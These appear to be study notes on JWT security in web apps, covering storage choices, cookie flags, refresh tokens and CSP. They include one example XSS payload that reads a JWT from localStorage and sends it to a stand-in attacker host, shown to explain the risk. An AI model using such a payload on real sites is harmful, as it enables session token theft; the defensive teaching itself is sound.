JSON Web Tokens

JWT can be stateless (server does not store client data) or stateful (server stores client data)
Token authentication is stateful.

# Best Security Practices in Web Applications

JWT are encoded in base 64, they're not encrypted. 
Typically, JWT are stored on the client side, in the browser's `localStorage` or `sessionStorage`, which are accessible via JavaScript:
```java
localStorage.getItem("jwt");
```
If your website is vulnerable to cross-site scripting XSS, attackers can inject their java script code and steal your JWT. 
```java
<script>
fetch('attacker.com/getToken=' + localStorage.getItem("jwt"));
</script>
```
Keep in mind that JWT is harder to revoke compare to a session token. Session tokens can just be revoked if we remove them from our server. But JWTs only have an expiration. 

We can also store JWT in cookies. We can mark a cookie with the `HttpOnly` flag, which makes the cookie not accessible by javascript on the client side. It can only be read by the server.

- So don't accept raw input from user. Always sanitize and escape.
- Don't store JWT in `localStorage`, that makes application vulnerable to XSS attacks that would steal the JWT[^1]. 
- Store JWT in cookies flagged with `HttpOnly`, `Secure`, and `SameSite=Strict`. With `HttpOnly`, cookies cannot be accessed by JavaScript code run on the client's side, so this secures the application against XSS attacks. `Secure` means the cookie is only sent via HTTPS. And, `SameSite=Strict` means the cookie is only sent to the same sites.[^2]
- Don't use the same JWT forever. Refresh them often using refresh tokens
- Implement a strict [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)  This is basically a HTTP response header that instructs the browser what javascript to execute and what to ignore to prevent XSS (cross-site scripting) and other similar attacks.

[^1]: XSS attacks includes injecting/running malicious java script code into a web application to steal information. This is possible through un-sanitized form input and vulnerable third-party dependencies. 
[^2]: For two sites to be considered to be the same, they must have the same high level domain name and use the same protocol. For example, `https://example.com` and `https://api.example.com` are considered the same site. 

Cookies are automatically sent with each request. 
Even if XSS attacks can't directly read `HttpOnly` cookies, they can use it in sending legitimate requests (within the same site scope).

This is why most web applications adopt a hybrid approach. When the user logs in, the server sends a short-lived (5-15 minutes) JWT in response body and sets a long-lived refresh token (1 month or so) in a cookie. JWT is stored in memory (e.g. a JavaScript variable). The client application will manually attach the JWT to legit requests, preventing CSRF attacks. We will still be wary of XSS attacks. However, if attackers manage to steal the access token (i.e. JWT), they don't have long to use it as it will automatically refresh. As the JWT expires, the client must request a new access token using the refresh token. This token is stored in a `HttpOnly`, `Secure`, and `SameSite=Strict` cookie and is used for authorization/authentication before a new JWT is issued.